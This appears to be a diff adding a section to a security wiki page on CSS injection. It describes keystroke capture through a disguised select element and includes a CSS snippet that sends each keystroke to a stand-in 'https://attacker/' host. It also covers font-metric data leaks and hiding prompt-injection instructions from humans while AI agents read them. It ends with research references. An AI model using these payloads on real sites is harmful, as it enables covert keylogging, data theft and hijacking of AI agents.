+`input[value$=...]` keyloggers usually fail because typing changes the DOM **property**, not the HTML **attribute**. A more reliable HTML-only primitive is a styled `select`: keyboard input changes the selected `option`, which can be detected with `:checked`, `:has()`, or adjacent-sibling chains such as `option+option:checked`. Each position can trigger a different request, and the control can be disguised with `appearance:none` and `-webkit-text-security:disc`. In Firefox, moving the focused `select` off-screen and back with a sub-millisecond animation resets incremental-search state and enables near real-time keystroke capture.<sup>[[23]](#references)</sup>
+
+```css
+option+option:checked { background:url(https://attacker/?k=a); }
+option+option+option:checked { background:url(https://attacker/?k=b); }
+select { appearance:none; -webkit-text-security:disc; }
+```
+
+When automatic outbound requests are blocked, another option is to use digit-specific `@font-face` rules plus altered font metrics to count how many times each digit appears in a text node, then expose only the matching attacker-controlled link so the victim's **next click** performs the exfiltration. The same rendering discrepancies can also be chained with [indirect prompt injection](../../../AI/AI-Prompts.md): humans may see benign CSS-generated text via `:before` / `:after`, while an AI agent still reads hidden HTML instructions and executes attacker-chosen browsing steps.<sup>[[23]](#references)</sup>
+
+PortSwigger published a companion materials repository with standalone PoCs for several of these chains.<sup>[[24]](#references)</sup>
+
+## References
+
+- [1] [LINE CTF 2022 - CSS/XS-Leak writeup (gist)](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
+- [2] [Better Exfiltration via HTML Injection (d0nut)](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
+- [3] [Exfiltration via CSS Injection](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
+- [4] [CSS Injection Primitives (Doomsday Vault)](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
+- [5] [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
+- [6] [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
+- [7] [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
+- [8] [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
+- [9] [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
+- [10] [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)
+- [11] [Blind CSS Exfiltration (PortSwigger)](https://portswigger.net/research/blind-css-exfiltration)
+- [12] [CSS Injection Attacks - slides (Pepe Vila)](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
+- [13] [Pepe Vila's @import CSS exfiltration PoC (gist)](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)
+- [14] [CSS based Attack: Abusing unicode-range of @font-face (Masato Kinugawa)](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
+- [15] [Error-Based XS-Search PoC (@terjanq)](https://twitter.com/terjanq/status/1180477124861407234)
+- [16] [New technique of stealing data using CSS and Scroll-to-Text Fragment (SECFORCE)](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
+- [17] [Wykradanie danych w świetnym stylu (Michał Bentkowski, sekurak)](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)
+- [18] [PoC: leaking the charset with a default font (Cgvwzq & Terjanq)](https://demo.vwzq.net/css2.html)
+- [19] [What can we do with single CSS injection? (Slackers thread)](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/)
+- [20] [justCTF 2022 write-up (Huli's blog)](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)
+- [21] [bi0sCTF 2022 - Emo-Locker writeup](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)
+- [22] [Gist by d0nutptr](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)
+- [23] [CSS: The Bomb Inside Your Inbox (PortSwigger)](https://portswigger.net/research/css-the-bomb-inside-your-inbox)
+- [24] [PortSwigger materials repo: css-the-bomb-inside-your-inbox](https://github.com/portswigger/css-the-bomb-inside-your-inbox)
+
+{{#include ../../../banners/hacktricks-training.md}}
